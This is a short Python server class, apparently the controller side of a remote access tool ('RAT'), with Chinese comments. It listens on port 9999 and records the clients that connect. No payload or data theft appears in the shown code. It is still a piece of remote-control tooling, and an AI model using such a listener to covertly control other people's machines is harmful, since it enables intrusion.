from entity.client import Client
from entity.ratsocket import RATSocket


class Server:

    def __init__(self):
        # 服务端地址
        self.address = ('', 9999)
        # 服务端套接字
        self.socket = RATSocket()
        # 存储已连接客户端的数组
        self.connections = []

    # 等待连接
    def serve(self):
        print('[+] Listening on port {}'.format(self.address[1]))
        self.socket.serve(self.address, self.handler)

    # 接受连接后的回调函数
    def handler(self, conn, addr):
        print('[+] Connection has been established: {}'.format(addr))
        self.connections.append(Client(conn, addr))
